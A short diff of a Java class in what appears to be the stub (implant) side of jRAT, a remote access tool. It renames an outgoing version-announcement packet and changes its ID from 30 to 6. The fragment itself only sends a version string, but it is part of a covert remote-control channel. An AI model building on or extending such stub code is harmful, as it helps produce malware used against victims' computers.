@@ -2,25 +2,20 @@ package se.jrat.stub.packets.outgoing;
 
 import java.io.DataOutputStream;
 
+import se.jrat.common.Version;
 import se.jrat.common.io.StringWriter;
 
 
-public class Packet30InitVersion extends AbstractOutgoingPacket {
-
-	private String version;
-
-	public Packet30InitVersion(String version) {
-		this.version = version;
-	}
+public class Packet6InitVersion extends AbstractOutgoingPacket {
 
 	@Override
 	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
-		sw.writeLine(version);
+		sw.writeLine(Version.getVersion());
 	}
 
 	@Override
 	public byte getPacketId() {
-		return (byte) 30;
+		return (byte) 6;
 	}
 
 }
